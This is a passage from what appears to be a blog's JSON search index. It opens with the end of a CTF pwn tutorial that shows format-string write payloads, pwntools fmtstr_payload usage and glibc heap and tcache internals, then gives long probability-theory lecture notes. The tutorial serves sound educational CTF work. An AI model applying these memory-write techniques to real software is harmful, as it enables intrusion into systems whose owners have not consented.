f&quot;%&#123;offset + k&#125;$s&quot;.encode() return fmt + b&quot;A&quot;*(8 * k - len(fmt)) + p64(addr) offset: discovered offset addr: address to read from 8*k: alignment padding (if k=1 fails, k=4 is often more stable) WritingTypical workflow Find offset S using AAAA,%p,%p,... Place target addresses at the end (avoid \\x00 truncation): keep the format string ASCII in front append addresses at the tail use %K$... to reference them Alignment/padding: written: number of bytes printed so far want: target value modulo write width compute: 123456base = 256 # %hhn (1 byte)base = 65536 # %hn (2 bytes)base = 2**32 # %n (4 bytes)base = 2**64 # %ln/%lln (8 bytes)pad = (want - (written % base)) % base Perform write: %K$hhn (1 byte) %K$hn (2 bytes) %K$n (4 bytes) %K$ln / %K$lln (8 bytes on x86_64) For multi-byte writes, it’s best to write in ascending order or just use byte-wise %hhn. Writing 1 byte (%hhn)Example: set the lowest byte at pwnme_addr to 0x90: 1234payload =b&quot;%144c&quot;b&quot;%K$hhn&quot;+ p32(pwnme_addr) If written%256 isn’t starting from 0, compute pad using the formula. fmtstr_payloadPwntools provides a convenient function: 1fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;) Parameters: offset: the first controllable argument slot position writes: &#123;address: value, ...&#125; numbwritten: bytes already printed before printf write_size: &#39;byte&#39;|&#39;short&#39;|&#39;int&#39;|&#39;long&#39; Heap ExploitationHeap exploitation ultimately aims to hijack the allocator, so it mistakenly treats a sensitive address (GOT, stack return address, hooks, function pointers) as a normal free chunk, allocates it to you, and grants an arbitrary write. Before that, you often need an information leak to know where to write. First distinguish libc vs glibc: libc usually refers to the standard C library specification (API/behavior). glibc is GNU’s concrete implementation, defining the actual heap internals (chunk layout, bins, tcache, etc.). Chunk structure: heap memory is divided into chunks. Each chunk has header metadata plus a user area. Header fields: prev_size: if the previous physical chunk is free, stores its size; otherwise it belongs to previous user data. size: current chunk size; low 3 bits are flags (e.g., prev_in_use). Free-list pointers: when freed, the first 16 bytes of user area are reused as fd and bk. Heap grows from low to high; chunk sizes are typically aligned to 0x10. Bins: glibc uses multiple free lists to manage chunks efficiently: Fastbin: singly-linked, LIFO, small sizes [0x20, 0x80] Tcache: introduced in glibc 2.26, per-thread, singly-linked, LIFO, sizes [0x20, 0x410], max 7 per size class, no consolidation Smallbin: doubly-linked, FIFO, sizes [0x20, 0x400] Unsorted bin: doubly-linked, a single list, acts as a staging area Top chunk: large free chunk at heap top used for extending allocations 1. Free chunk consolidation (merging) To reduce fragmentation, glibc tries to merge adjacent free chunks. Default: merges for doubly-linked bins and top chunk. Fastbin: does not merge by default, but large allocations may trigger malloc_consolidate. Tcache: never merges. 2. Key tcache properties Highest priority: malloc checks tcache first; free fills tcache first. Capacity: 7 chunks per size class (free 7 to fill; the 8th goes elsewhere). Metadata is on the heap: tcache management struct is itself heap-allocated. Double-free protection via a tcache_key stored in the reused bk field. Different libc versions have different checks and strategies. Glibc 2.31(Sections and diagrams already in English identifiers; content above is translated. The remainder of the article continues similarly: keep code and technical terms, translate prose, and remove Chinese-only parts.) Challenge Categories Pwn fundamentals HTB Questionnaire Writeup HTB Lesson Writeup Buffer Overflow Struct field hijacking Attack-Defense World hello_pwn Writeup ROP ret2shellcode HTB Regularity Writeup ret2text CTF.show Pwn Beginner Pwn 38 Attack-Defense World level0 Writeup TJCTF 2025 pwn/i-love-birds Writeup ret2plt CTF.show Pwn Beginner Pwn 40 Attack-Defense World level2 Writeup (32-bit) HTB You_know_0xDiablos Writeup (32-bit) ret2libc CTF.show Pwn Beginner Pwn 46 5 Format String Vulnerabilities HTB racecar Writeup (leaking info via format string) Attack-Defense World CGfsb Writeup (modifying a target variable via format string) Heap Exploitation","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"}]},{"title":"Probability Theory","slug":"TUM  数学 笔记/概率统计/概率论-Probability-Theory","date":"2025-04-26T18:32:06.000Z","updated":"2026-02-25T05:59:20.485Z","comments":true,"path":"2025/04/26/TUM  数学 笔记/概率统计/概率论-Probability-Theory/","permalink":"https://archer-baiyi.github.io/en/2025/04/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E7%BB%9F%E8%AE%A1/%E6%A6%82%E7%8E%87%E8%AE%BA-Probability-Theory/","excerpt":"Notes of Probability Theory","text":"BasicsDefinition: Let $I \\subseteq \\mathbb{R}$. Let $X_t : \\Omega \\to \\mathbb{R}, t\\in I$, be random variables on the same probability space $(\\Omega. \\mathcal{F}, P)$. Then $X = (X_t)_{t \\in I}$ is called a real-valued stochastic process. Expected value / ExpectationDefinition : Let $X$ be a random variable on a probability space $(\\Omega,\\mathcal{F},P)$. The expectation of $X$ is defined by\\mathbb{E}[X] = \\int_{\\Omega}X(\\omega)P(d\\omega). Theorem: Let $X:\\Omega \\to S$ be a random variable on a probability space $(\\Omega,\\mathcal{F},P)$ with distribution $\\mu$ and let $g:S\\to \\mathbb{R}$ be a measurable function. Then\\mathbb{E}[g(X)] = \\int_{S}g(x)\\mu(dx). Corollary: If $X$ is a discrete random variable with values in $S$, then \\mathbb{E}[g(X)] = \\sum_{x \\in S}g(x)P(X=x). Corollary: If $X$ is a discrete random variable with values in $S \\subseteq \\mathbb{R}$, then \\mathbb{E}[X] = \\sum_{x \\in S}xP(X=x).Proof: Choose $g = id_S: S \\to S \\subseteq \\mathbb{R}$.$\\square$ Corollary: If $X : \\Omega \\to \\mathbb{R}^n$ has the probability density function (Verteilungsdichte) $f$, then for every Borel-measurable function $g : \\mathbb{R}^n \\to \\mathbb{R}$, the following holds: \\mathbb{E}[g(X)] = \\int_{\\mathbb{R}^n} g(x) f(x) \\, dx. Corollary: If $X$ has values in $\\mathbb{R}$ \\mathbb{E}[X] = \\int_{\\mathbb{R}} x f(x) \\, dx. Theorem (Linearity): Let $X,Y :\\Omega \\to \\mathbb{R}$ be random variables in $\\mathcal{L}^1$. Then\\mathbb{E}[aX+bY] = a\\mathbb{E}[X] + b\\mathbb{E}[Y] \\ \\ \\text{ for all }a,b \\in \\mathbb{R} Theorem: Let$X,Y :\\Omega \\to \\mathbb{R}$be independent random variables, $g,h: \\mathbb{R} \\to \\mathbb{R}$ be Borel-measurable function with $E[|g(X)|], E[|h(Y)|] &lt; \\infty$. Then\\mathbb{E}[g(X)h(Y)] = \\mathbb{E}[g(X)] \\mathbb{E}[h(Y)]. proof: Since $X$ and $Y$ are independent, the joint distribution of $(X, Y)$ is the product of the marginal distributions $P_X \\times P_Y$. Using Fubini’s theorem, we obtain \\begin{align*} \\mathbb{E}[g(X)h(Y)] &= \\int_{\\mathbb{R}} \\int_{\\mathbb{R}} g(x)h(y) \\, P_X(dx) P_Y(dy)\\\\ &= \\left( \\int_{\\mathbb{R}} g(x) \\, P_X(dx) \\right) \\left( \\int_{\\mathbb{R}} h(y) \\, P_Y(dy) \\right) = \\mathbb{E}[g(X)] \\mathbb{E}[h(Y)]. \\end{align*}$\\square$ Corollary: Let$X,Y :\\Omega \\to \\mathbb{R}$be independent random variables in $\\mathcal{L}^1$, then \\mathbb{E}[XY] = \\mathbb{E}[X] \\mathbb{E}[Y].MomentDefinition : $E[X^n]$is called the $n^{\\text{th}}$ moment of X. Theorem:Let $X \\sim \\mathcal{N}(\\mu,\\sigma^2)$ be a random variable. Then for any non-negative integer $p$ we have:\\mathbb{E}[(X - \\mu)^p] =\\begin{cases}0 & \\text{if } p \\text{ is odd}, \\\\\\sigma^p (p - 1)!! & \\text{if } p \\text{ is even}.\\end{cases}Here, $n!!$ denotes the double factorial, that is, the product of all numbers from $n$ to 1 that have the same parity as $n$. Corollary:Let $X \\sim \\mathcal{N}(0,\\sigma^2)$ be a random variable. Then for any non-negative integer $p$ we have:\\mathbb{E}[X^p] =\\begin{cases}0 & \\text{if } p \\text{ is odd}, \\\\\\sigma^p (p - 1)!! & \\text{if } p \\text{ is even}.\\end{cases} Example: Let $X \\sim \\mathcal{N}(0,\\sigma^2)$ be a random variable, we have: $\\mathbb{E}[X^2] = \\sigma^2$ $\\mathbb{E}[X^3] = 0$ $\\mathbb{E}[X^4] = 3 \\sigma^4$ VarianceDefinition: Let$X\\in \\mathcal{L}^1$. Then \\text{Var}(X) = \\mathbb{E}[(X-\\mathbb{E}(X))^2]is called the variance of$X$and \\sigma_X = \\sqrt{Var(X)}is the standard deviation of $X$. Theorem: Let$X\\in \\mathcal{L}^1$, then\\text{Var}(X) = \\mathbb{E}[X^2] - \\mathbb{E}[X]^2. proof: let $\\mu:=E[X]$. \\begin{align*} \\text{Var}(X) &= \\mathbb{E}[(X-\\mu)^2]\\\\ &= \\mathbb{E}[X^2-2\\mu X + \\mu^2]\\\\ &= \\mathbb{E}[X^2]-2\\mu E[X] + \\mu^2\\\\ &= \\mathbb{E}[X^2]- \\mu^2 \\end{align*}$\\square$ Theorem: Let $X$ be a random variable with finite expectation. For $a,b \\in \\mathbb{R}$, it holds that:\\text{Var}(aX + b) = a^2 \\text{Var}(X) proof: \\begin{align*} \\text{Var}(aX + b) &= \\mathbb{E}\\left[(aX + b - \\mathbb{E}[aX+b])^2\\right] \\\\ &= \\mathbb{E}\\left[(aX + b - (a\\mathbb{E}[X] + b))^2\\right] \\quad \\text{(by linearity)}\\\\ &= \\mathbb{E}\\left[a^2 (X - \\mathbb{E}[X])^2\\right] \\\\ &= a^2 \\text{Var}(X) \\end{align*}$\\square$ Theorem: Let $X,Y$ be independent random variables, then\\text{Var}(X + Y) = \\text{Var}(X) + \\text{Var}(Y) proof: \\begin{align*} \\text{Var}(X + Y) &= \\mathbb{E}[(X+Y)^2] - \\mathbb{E}[X+Y]^2 \\\\ &= \\mathbb{E}[X^2] + \\mathbb{E}[Y^2] - \\mathbb{E}[X]^2 - \\mathbb{E}[Y^2] \\quad \\text{(by independence)}\\\\ &= \\text{Var}(X) + \\text{Var}(Y) \\end{align*}$\\square$ Theorem:Let $X,Y$ be independent random variables, then Var(XY) = Var(X)Var(Y) + Var(X)\\mathbb{E}[Y]^2 + Var(Y)\\mathbb{E}[X]^2 Proof: \\begin{align*} Var(XY) &= \\mathbb{E}[X^2Y^2] - \\mathbb{E}[XY]^2\\\\ &=\\mathbb{E}[X^2]\\mathbb{E}[Y^2] - \\mathbb{E}[X]^2\\mathbb{E}[Y]^2\\\\ &= (Var(X) + \\mathbb{E}[X]^2)(Var(Y) + \\mathbb{E}[Y]^2) - \\mathbb{E}[X]^2\\mathbb{E}[Y]^2\\\\ &= Var(X)Var(Y) + Var(X)\\mathbb{E}[Y]^2 + Var(Y)\\mathbb{E}[X]^2 \\end{align*}. $\\square$ CovarianceDefinition :For real-valued random variables$X, Y \\in L^2$, the covariance of$X$and$Y$is defined by\\text{Cov}(X, Y) = \\mathbb{E}\\Bigl[(X - \\mathbb{E}[X])(Y - \\mathbb{E}[Y])\\Bigl] Theorem:(a) $\\text{Cov}(X, X) = \\text{Var}(X)$(b) $\\text{Cov}(X, Y) = \\mathbb{E}[XY] - \\mathbb{E}[X]\\mathbb{E}[Y]$(c) If $X$ and $Y$ are independent, then $\\operatorname{Cov}(X, Y) = 0$. Proof: (a) Clear from the definition. (b) By the linearity of expectation, it follows: \\text{Cov}(X, Y) = \\mathbb{E}[XY - X\\mathbb{E}[Y] - \\mathbb{E}[X]Y + \\mathbb{E}[X]\\mathbb{E}[Y]] = \\mathbb{E}[XY] - \\mathbb{E}[X]\\mathbb{E}[Y].(c) The claim follows from $\\mathbb{E}[XY] = \\mathbb{E}[X]\\mathbb{E}[Y]$.$\\square$ Theorem: Let $X_i, Y_j \\in L^2$, $a_i, b_j \\in \\mathbb{R}$, $1 \\leq i \\leq n$, $1 \\leq j \\leq m$. Then:(a) The covariance is bilinear:\\operatorname{Cov}\\left( \\sum_{i=1}^{n} a_i X_i, \\sum_{j=1}^{m} b_j Y_j \\right) = \\sum_{i=1}^{n} \\sum_{j=1}^{m} a_i b_j \\operatorname{Cov}(X_i, Y_j)(b)\\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) = \\sum_{i=1}^{n} \\operatorname{Var}(X_i) + \\sum_{\\substack{i,j=1\\\\i \\neq j}}^{n} \\operatorname{Cov}(X_i, X_j)In particular:\\operatorname{Var}(X_1 + X_2) = \\operatorname{Var}(X_1) + \\operatorname{Var}(X_2) + 2 \\operatorname{Cov}(X_1, X_2)(c) If $X_1, \\dots, X_n$ are uncorrelated, i.e., $\\operatorname{Cov}(X_i, X_j) = 0$ for all $i \\neq j$, then:\\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) = \\sum_{i=1}^{n} \\operatorname{Var}(X_i)This holds especially if $X_1, \\dots, X_n$ are independent. Proof: (a) Since $\\operatorname{Cov}(X, Y) = \\operatorname{Cov}(Y, X)$, it suffices to show linearity in the first argument. From the linearity of expectation, it follows: \\begin{align*} \\operatorname{Cov}\\left( \\sum_{i=1}^{n} a_i X_i, Y \\right) &= \\mathbb{E}\\left[ \\left( \\sum_{i=1}^{n} a_i X_i - \\mathbb{E}\\left[ \\sum_{i=1}^{n} a_i X_i \\right] \\right)(Y - \\mathbb{E}[Y]) \\right] \\\\ &= \\mathbb{E}\\left[ \\sum_{i=1}^{n} a_i (X_i - \\mathbb{E}[X_i])(Y - \\mathbb{E}[Y]) \\right] = \\sum_{i=1}^{n} a_i \\operatorname{Cov}(X_i, Y) \\end{align*}(b) Using part (a), we get: \\begin{align*} \\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) &= \\operatorname{Cov}\\left( \\sum_{i=1}^{n} X_i, \\sum_{j=1}^{n} X_j \\right) = \\sum_{i=1}^{n} \\sum_{j=1}^{n} \\operatorname{Cov}(X_i, X_j) \\\\ &= \\sum_{i=1}^{n} \\operatorname{Var}(X_i) + \\sum_{\\substack{i,j=1\\\\i \\neq j}}^{n} \\operatorname{Cov}(X_i, X_j) \\end{align*}In the special case $n = 2$, this gives: \\operatorname{Var}(X_1 + X_2) = \\operatorname{Var}(X_1) + \\operatorname{Var}(X_2) + \\operatorname{Cov}(X_1, X_2) + \\operatorname{Cov}(X_2, X_1)(c) Follows from part (b).$\\square$ Moment generating functionDefinition: Let $X$ be a random variable such that $\\mathbb{E}[e^{tX}] &lt; \\infty$, then the moment generating function is defined as M_X(t) := \\mathbb{E}[e^{tX}].for all $t \\in \\mathbb{R}$. Theorem: Let $X \\sim N(\\mu,\\sigma^2)$, then the moment generating function exists and is equal to M_X(t) = e^{\\mu t + \\frac{\\sigma^2 t^2}{2}}.Clearly, if $X \\sim N(0,1)$, we haveM_X(t) = e^{\\frac{t^2}{2}}. Proof: Let $X \\sim N(\\mu,\\sigma^2)$, and f(x) := \\frac{1}{\\sqrt{2\\pi} \\sigma} e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}}be its density function. Then, by definition we have \\begin{align*} M_X(t) = \\mathbb{E}[e^{tX}] &= \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} e^{tx} \\cdot e^{- \\frac{(x - \\mu)^2}{2\\sigma^2}}\\, dx \\\\ &= \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left(tx - \\frac{(x - \\mu)^2}{2\\sigma^2} \\right)\\, dx \\end{align*}Notice that \\begin{align*} tx - \\frac{(x - \\mu)^2}{2\\sigma^2} &= tx - \\frac{1}{2\\sigma^2}(x^2 - 2\\mu x + \\mu^2) \\\\ &= tx - \\frac{x^2}{2\\sigma^2} + \\frac{\\mu x}{\\sigma^2} - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2}x^2 + \\left(t + \\frac{\\mu}{\\sigma^2}\\right)x - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ x^2 - 2\\sigma^2 \\left(t + \\frac{\\mu}{\\sigma^2}\\right)x \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ x^2 - 2(\\mu + \\sigma^2 t)x \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ x^2 - 2(\\mu + \\sigma^2 t)x + (\\mu + \\sigma^2 t)^2 - (\\mu + \\sigma^2 t)^2 \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ (x - \\mu - \\sigma^2 t)^2 - (\\mu + \\sigma^2 t)^2 \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} + \\frac{(\\mu + \\sigma^2 t)^2 - \\mu^2}{2\\sigma^2} \\\\ &= -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} + \\mu t + \\frac{1}{2} \\sigma^2 t^2 \\end{align*}Then we have \\begin{align*} M_X(t) &= \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left( -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} + \\mu t + \\frac{1}{2} \\sigma^2 t^2 \\right)\\, dx \\\\ &=e^{\\mu t + \\frac{1}{2} \\sigma^2 t^2} \\cdot \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left( -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} \\right)\\, dx \\\\ &= e^{\\mu t + \\frac{\\sigma^2 t^2}{2}}. \\end{align*}p.s.: the calculation/proof of Gaussian integral \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left( -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} \\right)\\, dx = \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} e^{-\\frac{y^2}{2}}\\, dy = 1can be found here: https://archer-baiyi.github.io/2025/06/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/Probability-Distributions/#Normal-Distribution .$\\square$ Important InequalitiesTheorem (Jensen&#39;s Inequality):Let $\\varphi:\\mathbb{R} \\to \\mathbb{R}$ be convex. If $\\mathbb{E}[|X|] &lt; \\infty$, then $\\mathbb{E}[\\varphi(X)]$ is well-defined and one has \\varphi(\\mathbb{E}[X]) \\leq \\mathbb{E}[\\varphi(X)]. Corollary:1. |\\mathbb{E}[X]| \\leq \\mathbb{E}[|X|]2. for $p \\geq 1 :$|\\mathbb{E}[X]|^p \\leq \\mathbb{E}[|X|^p]3. for $1 \\leq p &lt; q :$(\\mathbb{E}[|X|^p])^{\\frac{1}{p}} \\leq (\\mathbb{E}[|X|^q])^{\\frac{1}{q}} proof: 1. take $\\varphi(x) = |x|$. 2. take $\\varphi(x) = |x|^p, p \\geq 1$. 3. Let $1 \\leq p &lt; q , \\alpha := q/p &gt; 1, Z := |X|^p$. From 2 we have \\begin{align*} &\\quad |\\mathbb{E}[Z]|^\\alpha \\leq \\mathbb{E}[|Z|^\\alpha] \\\\ \\Longleftrightarrow &\\quad |\\mathbb{E}[|X|^p]|^\\alpha \\leq \\mathbb{E}[|X|^{\\alpha p}] \\\\ \\Longleftrightarrow &\\quad |\\mathbb{E}[|X|^p]|^{\\frac{1}{p}} \\leq \\mathbb{E}[|X|^{\\alpha p}]^{\\frac{1}{\\alpha p}} \\\\ \\Longleftrightarrow &\\quad (\\mathbb{E}[|X|^p])^{\\frac{1}{p}} \\leq (\\mathbb{E}[|X|^q])^{\\frac{1}{q}} \\end{align*}$\\square$ Theorem (Markov&#39;s inequality):Let $X$ be a real-valued random variable and let $f : [0, \\infty) \\to [0, \\infty)$ be a monotonically increasing function with $f(x) &gt; 0$ for all $x &gt; 0$.Then for all $a &gt; 0$ we have:P(|X| \\geq a) \\leq \\frac{\\mathbb{E}[f(|X|)]}{f(a)}.In particular, for all $a, p &gt; 0$, it holds:P(|X| \\geq a) \\leq \\frac{\\mathbb{E}[|X|^p]}{a^p}. Proof: Since $f \\geq 0$ and is monotonically increasing, we have : f(|X|) \\geq f(|X|)\\mathbf{1}_{\\{|X| \\geq a\\}} \\geq f(a)\\mathbf{1}_{\\{|X| \\geq a\\}}.From the monotonicity of the expectation, it follows that: \\mathbb{E}[f(|X|)] \\geq \\mathbb{E}[f(a)\\mathbf{1}_{\\{|X| \\geq a\\}}] = f(a)P(|X| \\geq a).Since $f(a) &gt; 0$, the claim follows. $\\square$ Theorem (Chebyshev&#39;s inequality):Let $X \\in \\mathcal{L}^2$ (i.e.$\\mathbb{E}[|X|^2] &lt; \\infty$) be a real-valued random variable, then for all $a &gt; 0$ we have:P(|X-\\mathbb{E}[X]| \\geq a) \\leq \\frac{\\text{Var}(X)}{a^2}. Proof: Let $Y = X-\\mathbb{E}[X]$, $f(x):=x^2$. By applying Markov’s inequality we have: P(|X-\\mathbb{E}[X]| \\geq a) \\leq \\frac{ \\mathbb{E}[|X-\\mathbb{E}[X]]}{a^2}\\leq \\frac{\\text{Var}(X)}{a^2}.$\\square$ ConvergenceDefinition: For $p \\geq 1$ we say $Y \\in L^p$ if $E[|Y|^p] &lt; \\infty$. Definition: Let $X,X_i,i \\geq 1$ be random variables on the same probability space $(\\Omega,\\mathcal{F},P)$.1. $X_n \\rightarrow X$ almost surely (a.s.) ifP(\\{\\omega | \\lim_{n \\to \\infty} X_n(\\omega) = X(\\omega)\\}) = 1.We write $X_n \\xrightarrow{P-a.s.} X$.2. $X_n \\rightarrow X$ in probability if \\forall \\varepsilon > 0 : \\lim_{n \\to \\infty} P(|X_n - X| > \\varepsilon) = 0.We write $X_n \\xrightarrow{P} X$ or $X_n \\xrightarrow{\\text{in probability}} X$.3. $X_n \\to X$ in $L^p$ for $p \\geq 1$ if $X_n \\in L^p$ for all $n$, $X \\in L^p$, and\\lim_{n \\to \\infty} E[|X_n - X|^p] = 0.We write $X_n \\xrightarrow{L^p} X$. Definition: Let $\\mu_n, \\mu$ be probability measures on $(\\mathbb{R}, \\mathcal{B}(\\mathbb{R}))$, we say that $\\mu_n$ converges weakly to $\\mu$ ($\\mu_n \\Rightarrow \\mu$ or $\\mu_n \\xrightarrow{w} \\mu$) if\\int f \\, d\\mu_n \\longrightarrow \\int f \\, d\\mu \\quad \\forall f : \\mathbb{R} \\to \\mathbb{R} \\text{ bounded and continuous.} \\tag{3.4}We say $X_n \\xrightarrow{w} X$ if $\\mathcal{L}(X_n) \\xrightarrow{w} \\mathcal{L}(X)$, where $\\mathcal{L}(X_n)$ denotes the distribution of $X_n$. Remark: X_n \\xrightarrow{w} X \\quad \\Longleftrightarrow \\quad E[f(X_n)] \\underset{n \\to \\infty}{\\longrightarrow} E[f(X)] \\quad \\forall f : \\mathbb{R} \\to \\mathbb{R} \\text{ bounded and continuous.} Proof: $E[f(Y)] = \\int f(y) \\, \\mu(dy) \\quad \\text{with } \\mu = \\mathcal{L}(Y).$$\\square$ Theorem:(a) If $p_1 &lt; p_2$, then $X_n \\to X$ in $L^{p_2}$ implies $X_n \\to X$ in $L^{p_1}$.(b) $X_n \\to X$ in $L^p$ or almost surely implies $X_n \\to X$ in probability.(c) Suppose there exists $Y \\in L^p$ such that $|X_n| \\leq Y$ for all $n$. If $X_n \\to X$ in probability and $X \\in L^p$, then $X_n \\to X$ in $L^p$. proof: $\\square$ Corollary: If $X_n \\to X’$ in $L^p$ and $X_n \\to X’’$ almost surely, then $X’ = X’’$ a.e. (i.e. $P(X’ = X’’) = 1$). proof: It follows from the Theorem that $X_n \\to X$ and $X_n \\to X’’$ in probability, since the limit is unique, one has $X’ = X’’$ a.e.$\\square$ Conditional ExpectationDefinitionsDefinition: Let $(\\Omega, \\mathcal{F}_0, P)$ be a probability space. Let $X : \\Omega \\to [-\\infty, +\\infty]$ be an $(\\mathcal{F}_0, \\mathcal{B}([-\\infty,+\\infty]))$-measurable random variable with $\\mathbb{E}[|X|] &lt; \\infty$ or $X \\geq 0$, and let $\\mathcal{F} \\subseteq \\mathcal{F}_0$ be a $\\sigma$-algebra.The conditional expectation $\\mathbb{E}[X \\mid \\mathcal{F}]$ of $X$ given $\\mathcal{F}$ is a random variable $Y : \\Omega \\to [-\\infty, +\\infty]$ with the following properties:(C1) $Y$ is $(\\mathcal{F}, \\mathcal{B}([-\\infty,+\\infty]))$-measurable.(C2)\\int_A X \\, dP = \\int_A Y \\, dP \\quad \\forall A \\in \\mathcal{F}If $\\mathbb{E}[|X|] &lt; \\infty$, then $\\mathbb{E}[X \\mid \\mathcal{F}]$ is almost surely finite. Every random variable fulfilling (C1) and (C2) is called a version of $\\mathbb{E}[X \\mid \\mathcal{F}]$. Definition:\\mathbb{E}[X \\mid Y]:= \\mathbb{E}[X \\mid \\sigma(Y)] Theorem:The conditional expectation exists and is almost surely unique. ProportiesTheorem:1. $X$ $\\mathcal{F}$-measurable $\\Longrightarrow$ $\\mathbb{E}[X\\mid \\mathcal{F}] = X$ almost surely.2. $\\sigma(X)$ and $\\mathcal{F}$ are independent $\\Longrightarrow$ $\\mathbb{E}[X \\mid \\mathcal{F}] = \\mathbb{E}[X]$ almost surely. Theorem:1. Linearity: For $a \\in \\mathbb{R}$,\\mathbb{E}[aX + Y \\mid \\mathcal{F}] = a \\mathbb{E}[X \\mid \\mathcal{F}] + \\mathbb{E}[Y \\mid \\mathcal{F}] \\quad \\text{almost surely.}2. Monotonicity: $X \\leq Y \\quad \\Longrightarrow \\quad \\mathbb{E}[X \\mid \\mathcal{F}] \\leq \\mathbb{E}[Y \\mid \\mathcal{F}]$ almost surely.3. Monotone convergence: $X_n \\geq 0$, $X_n \\uparrow X \\quad \\Longrightarrow \\quad \\mathbb{E}[X_n \\mid \\mathcal{F}] \\uparrow \\mathbb{E}[X \\mid \\mathcal{F}]$ almost surely. Theorem: \\mathbb{E}[\\mathbb{E}[X \\mid \\mathcal{F}] = \\mathbb{E}[X] Theorem:If $X$ is $\\mathcal{F}$-measurable, $\\mathbb{E}[|XY|] &lt; \\infty$ and $\\mathbb{E}[|Y|] &lt; \\infty$, then\\mathbb{E}[XY \\mid \\mathcal{F}] = X \\mathbb{E}[Y \\mid \\mathcal{F}] \\quad \\text{almost surely}.This holds also if $X \\geq 0$ and $Y \\geq 0$. Theorem (“The smaller $\\sigma$-algebra wins”) : Let $\\mathcal{F}_1, \\mathcal{F}_2$ be $\\sigma$-algebras satisfying $\\mathcal{F}_1 \\subseteq \\mathcal{F}_2$,$X$ be random variable. Then \\mathbb{E}[\\mathbb{E}[X \\mid \\mathcal{F}_1] \\mid \\mathcal{F}_2] = \\mathbb{E}[\\mathbb{E}[X \\mid \\mathcal{F}_2] \\mid \\mathcal{F}_1]= \\mathbb{E}[X \\mid \\mathcal{F}_1]almost surely.","categories":[{"name":"TUM Math note","slug":"TUM-Math-note","permalink":"https://archer-baiyi.github.io/en/categories/TUM-Math-note/"},{"name":"Probability & Statistics","slug":"TUM-Math-note/Probability-Statistics","permalink":"https://archer-baiyi.github.io/en/categories/TUM-Math-note/Probability-Statistics/"}],"tags":[{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/en/tags/Probability-Theory/"}]}],"categories":[{"name":"TUM Math note","slug":"TUM-Math-note","permalink":"https://archer-baiyi.github.io/en/categories/TUM-Math-note/"},{"name":"Probability & Statistics","slug":"TUM-Math-note/Probability-Statistics","permalink":"https://archer-baiyi.github.io/en/categories/TUM-Math-note/Probability-Statistics/"},{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/en/tags/Probability-Theory/"},{"name":"distribution","slug":"distribution","permalink":"https://archer-baiyi.github.io/en/tags/distribution/"},{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/tags/CTF/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/en/tags/Hash/"},{"name":"python","slug":"python","permalink":"https://archer-baiyi.github.io/en/tags/python/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"}]}